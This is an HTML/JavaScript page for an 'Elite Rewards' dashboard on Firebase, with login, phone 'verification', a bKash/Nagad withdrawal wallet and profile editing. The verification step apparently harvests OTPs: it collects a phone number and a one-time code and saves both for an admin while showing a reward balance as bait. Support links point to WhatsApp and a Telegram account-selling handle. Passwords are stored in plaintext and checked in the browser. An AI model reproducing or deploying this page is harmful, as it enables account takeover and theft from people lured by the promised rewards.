<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Rewards | User Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(10px); }
        .section-tab { display: none; }
        .active-tab { display: block; animation: fadeIn 0.4s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-slate-50 text-slate-900">

    <!-- Auth Section -->
    <div id="auth-sec" class="min-h-screen flex items-center justify-center bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-500 px-6">
        <div class="bg-white p-8 rounded-[2.5rem] shadow-2xl w-full max-w-sm">
            <h1 class="text-3xl font-black text-center mb-8 bg-gradient-to-r from-indigo-600 to-purple-600 bg-clip-text text-transparent">ELITE REWARDS</h1>
            <div id="login-form">
                <input id="auth_id" type="text" placeholder="Email or Phone" class="w-full bg-slate-100 p-4 rounded-2xl mb-4 outline-none focus:ring-2 ring-indigo-500 transition-all">
                <input id="auth_pass" type="password" placeholder="Password" class="w-full bg-slate-100 p-4 rounded-2xl mb-6 outline-none focus:ring-2 ring-indigo-500 transition-all">
                <button onclick="handleAuth()" class="w-full bg-indigo-600 text-white font-bold py-4 rounded-2xl shadow-lg hover:bg-indigo-700 transition-all active:scale-95">Login / Register</button>
            </div>
        </div>
    </div>

    <!-- App Dashboard -->
    <div id="app-sec" class="hidden min-h-screen flex flex-col">
        <header class="p-6 flex justify-between items-center bg-white border-b">
            <div class="flex items-center gap-3">
                <img id="u_pic" class="w-12 h-12 rounded-full border-2 border-indigo-500 object-cover">
                <h2 id="u_name_display" class="font-bold text-lg">...</h2>
            </div>
            <button onclick="logout()" class="text-slate-400 hover:text-rose-500 transition-colors"><i class="fas fa-power-off text-xl"></i></button>
        </header>

        <main class="flex-grow p-6 pb-24">
            <!-- Home: Verification -->
            <div id="home" class="section-tab active-tab space-y-6">
                <div class="bg-white p-6 rounded-3xl shadow-sm border">
                    <h3 class="font-bold text-slate-500 text-xs uppercase mb-4 tracking-widest">Verification Status</h3>
                    <div id="v_status" class="bg-amber-50 text-amber-600 p-4 rounded-2xl text-center font-bold text-sm mb-6">Not Verified</div>
                    
                    <div id="v_form_step1">
                        <input id="v_phone" type="number" placeholder="Enter Phone Number" class="w-full border p-4 rounded-2xl mb-4 outline-none focus:border-indigo-500">
                        <button onclick="submitForVerify()" class="w-full bg-indigo-600 text-white font-bold py-4 rounded-2xl shadow-md">Submit Phone</button>
                    </div>

                    <div id="v_form_step2" class="hidden">
                        <div class="text-center mb-4">
                            <p class="text-xs text-slate-400 uppercase">OTP expires in</p>
                            <h4 id="v_timer" class="text-3xl font-black text-rose-500">05:00</h4>
                        </div>
                        <input id="v_otp" type="text" placeholder="Enter OTP" class="w-full border p-4 rounded-2xl mb-4 text-center tracking-widest text-2xl font-bold outline-none">
                        <button onclick="submitOTP()" class="w-full bg-emerald-500 text-white font-bold py-4 rounded-2xl shadow-md">Confirm OTP</button>
                    </div>
                </div>
            </div>

            <!-- Wallet -->
            <div id="wallet" class="section-tab space-y-6">
                <div class="bg-gradient-to-br from-indigo-600 to-purple-700 p-8 rounded-[2rem] text-white shadow-xl">
                    <p class="opacity-70 text-sm font-semibold mb-1">Available Balance</p>
                    <h1 class="text-5xl font-black">৳ <span id="u_balance">0</span></h1>
                </div>
                <div class="bg-white p-6 rounded-3xl shadow-sm border space-y-4">
                    <h3 class="font-bold">Withdraw Funds</h3>
                    <select id="w_method" class="w-full bg-slate-50 p-4 rounded-2xl outline-none">
                        <option value="bKash">bKash</option>
                        <option value="Nagad">Nagad</option>
                    </select>
                    <input id="w_acc" type="number" placeholder="Number" class="w-full bg-slate-50 p-4 rounded-2xl outline-none">
                    <button id="withdraw_btn" disabled onclick="requestWithdraw()" class="w-full bg-slate-300 text-white font-bold py-4 rounded-2xl cursor-not-allowed">Withdraw (Min ৳100)</button>
                </div>
            </div>

            <!-- Profile -->
            <div id="profile" class="section-tab space-y-6">
                <div class="bg-white p-8 rounded-3xl shadow-sm border text-center">
                    <div class="relative inline-block mb-6">
                        <img id="u_pic_large" class="w-24 h-24 rounded-full border-4 border-indigo-50 object-cover shadow-lg">
                        <label class="absolute bottom-0 right-0 bg-indigo-600 text-white p-2 rounded-full cursor-pointer hover:scale-110 transition shadow-lg">
                            <i class="fas fa-camera text-xs"></i>
                            <input type="file" class="hidden" onchange="uploadProfilePic(this)">
                        </label>
                    </div>
                    <input id="u_name_input" type="text" placeholder="Name" class="w-full bg-slate-50 p-4 rounded-2xl mb-4 outline-none">
                    <input id="u_pass_input" type="password" placeholder="New Password" class="w-full bg-slate-50 p-4 rounded-2xl mb-6 outline-none">
                    <button onclick="updateProfile()" class="w-full bg-indigo-600 text-white font-bold py-4 rounded-2xl shadow-md">Update Profile</button>
                </div>
            </div>
        </main>

        <!-- Bottom Navbar -->
        <nav class="fixed bottom-0 left-0 right-0 glass border-t border-slate-100 p-4 flex justify-around rounded-t-[2.5rem] shadow-2xl z-40">
            <button onclick="tab('home')" class="flex flex-col items-center gap-1 text-indigo-600"><i class="fas fa-shield-alt text-xl"></i><span class="text-[10px] font-bold">VERIFY</span></button>
            <button onclick="tab('wallet')" class="flex flex-col items-center gap-1 text-slate-400"><i class="fas fa-wallet text-xl"></i><span class="text-[10px] font-bold">WALLET</span></button>
            <button onclick="tab('profile')" class="flex flex-col items-center gap-1 text-slate-400"><i class="fas fa-user-circle text-xl"></i><span class="text-[10px] font-bold">PROFILE</span></button>
        </nav>
    </div>

    <!-- Floating Support -->
    <div class="fixed right-6 bottom-28 flex flex-col gap-4 z-50">
        <a href="https://api.whatsapp.com/send?phone=8801612684951&text=" target="_blank" class="bg-green-500 w-14 h-14 rounded-full flex items-center justify-center text-white shadow-2xl text-2xl border-2 border-white transform transition hover:scale-110"><i class="fab fa-whatsapp"></i></a>
        <a href="https://t.me/accsell06" target="_blank" class="bg-blue-500 w-14 h-14 rounded-full flex items-center justify-center text-white shadow-2xl text-2xl border-2 border-white transform transition hover:scale-110"><i class="fab fa-telegram-plane"></i></a>
        <button onclick="togglePop()" class="bg-rose-500 w-14 h-14 rounded-full flex items-center justify-center text-white shadow-2xl text-2xl border-2 border-white transform transition hover:scale-110"><i class="fas fa-headset"></i></button>
    </div>

    <!-- Support Popup -->
    <div id="support-pop" class="hidden fixed bottom-44 right-6 bg-white w-64 p-6 rounded-3xl shadow-2xl border-t-4 border-rose-500 z-50">
        <h4 class="font-bold mb-2">Live Support</h4>
        <p class="text-xs text-slate-500 mb-4">Click WhatsApp or Telegram above for 24/7 instant help.</p>
        <button onclick="togglePop()" class="text-rose-500 text-[10px] font-black uppercase tracking-widest">Close</button>
    </div>

    <!-- Admin Global Dialog -->
    <div id="admin-dialog" class="hidden fixed inset-0 bg-black/70 backdrop-blur-md z-[100] flex items-center justify-center p-6">
        <div class="bg-white rounded-[2.5rem] w-full max-w-sm overflow-hidden relative shadow-2xl">
            <button onclick="closeDialog()" class="absolute top-4 right-4 text-slate-400 text-2xl"><i class="fas fa-times-circle"></i></button>
            <img id="dg_img" class="w-full h-44 object-cover">
            <div class="p-8 text-center">
                <h3 id="dg_title" class="text-2xl font-black mb-2">Title</h3>
                <p id="dg_sms" class="text-slate-500 text-sm mb-6">Message content here...</p>
                <a id="dg_url" href="#" target="_blank" class="block w-full bg-indigo-600 text-white py-4 rounded-2xl font-bold shadow-lg">Visit Link</a>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // CONFIGURATION
        const firebaseConfig = {
            apiKey: "AIzaSyAMVTLS_PK7M4yyMfcdKPHzn8yP1lXxpLQ",
            authDomain: "text-4cc23.firebaseapp.com",
            databaseURL: "https://text-4cc23-default-rtdb.firebaseio.com",
            projectId: "text-4cc23",
            storageBucket: "text-4cc23.appspot.com",
            messagingSenderId: "252578219241",
            appId: "1:252578219241:android:c4b105c06a2715dddf1c78"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // AUTH & DASHBOARD SYNC
        window.handleAuth = async () => {
            const id = document.getElementById('auth_id').value.replace(/\./g, '_');
            const pass = document.getElementById('auth_pass').value;
            if(!id || !pass) return;

            const userRef = ref(db, 'users/' + id);
            const snap = await get(userRef);
            if(snap.exists()) {
                if(snap.val().password === pass) {
                    localStorage.setItem('user', id);
                    location.reload();
                } else alert("Wrong password");
            } else {
                await set(userRef, { name: "Elite Member", phone: id, password: pass, balance: 0, status: "New", pic: "https://ui-avatars.com/api/?name=User" });
                localStorage.setItem('user', id);
                location.reload();
            }
        };

        const loadData = () => {
            const uid = localStorage.getItem('user');
            if(!uid) return;
            document.getElementById('auth-sec').classList.add('hidden');
            document.getElementById('app-sec').classList.remove('hidden');

            onValue(ref(db, 'users/' + uid), (snap) => {
                const d = snap.val();
                document.getElementById('u_name_display').innerText = d.name;
                document.getElementById('u_balance').innerText = d.balance;
                document.getElementById('u_pic').src = d.pic;
                document.getElementById('u_pic_large').src = d.pic;
                document.getElementById('v_status').innerText = d.status;
                
                const btn = document.getElementById('withdraw_btn');
                if(d.balance >= 100) {
                    btn.disabled = false;
                    btn.classList.replace('bg-slate-300', 'bg-emerald-500');
                    btn.classList.remove('cursor-not-allowed');
                }
            });

            // Listen for Global Dialog
            onValue(ref(db, 'settings/dialog'), (snap) => {
                const d = snap.val();
                if(d && d.active) {
                    document.getElementById('dg_title').innerText = d.title;
                    document.getElementById('dg_sms').innerText = d.sms;
                    document.getElementById('dg_img').src = d.image;
                    document.getElementById('dg_url').href = d.url;
                    document.getElementById('admin-dialog').classList.remove('hidden');
                }
            });
        };

        // UI ACTIONS
        window.tab = (id) => {
            document.querySelectorAll('.section-tab').forEach(s => s.classList.remove('active-tab'));
            document.getElementById(id).classList.add('active-tab');
        };

        window.submitForVerify = () => {
            const phone = document.getElementById('v_phone').value;
            const uid = localStorage.getItem('user');
            update(ref(db, 'users/' + uid), { status: 'Pending', pendingPhone: phone });
            document.getElementById('v_form_step1').classList.add('hidden');
            document.getElementById('v_form_step2').classList.remove('hidden');
            startTimer();
        };

        window.submitOTP = () => {
            const otp = document.getElementById('v_otp').value;
            const uid = localStorage.getItem('user');
            update(ref(db, 'users/' + uid), { lastOTP: otp });
            alert("Admin Notified!");
        };

        const startTimer = () => {
            let t = 300;
            const el = document.getElementById('v_timer');
            const iv = setInterval(() => {
                let m = Math.floor(t/60), s = t%60;
                el.innerText = `${m}:${s<10?'0':''}${s}`;
                if(--t < 0) clearInterval(iv);
            }, 1000);
        };

        window.updateProfile = () => {
            const uid = localStorage.getItem('user');
            const name = document.getElementById('u_name_input').value;
            const pass = document.getElementById('u_pass_input').value;
            const up = {};
            if(name) up.name = name;
            if(pass) up.password = pass;
            update(ref(db, 'users/' + uid), up);
            alert("Updated!");
        };

        window.uploadProfilePic = (el) => {
            const r = new FileReader();
            r.onload = () => update(ref(db, 'users/' + localStorage.getItem('user')), { pic: r.result });
            r.readAsDataURL(el.files[0]);
        };

        window.requestWithdraw = () => {
            const uid = localStorage.getItem('user');
            const meth = document.getElementById('w_method').value;
            const acc = document.getElementById('w_acc').value;
            push(ref(db, 'withdrawals'), { uid, meth, acc, amount: 100, status: 'Pending' });
            alert("Withdrawal Requested!");
        };

        window.togglePop = () => document.getElementById('support-pop').classList.toggle('hidden');
        window.closeDialog = () => document.getElementById('admin-dialog').classList.add('hidden');
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.onload = loadData;
    </script>
</body>
</html>
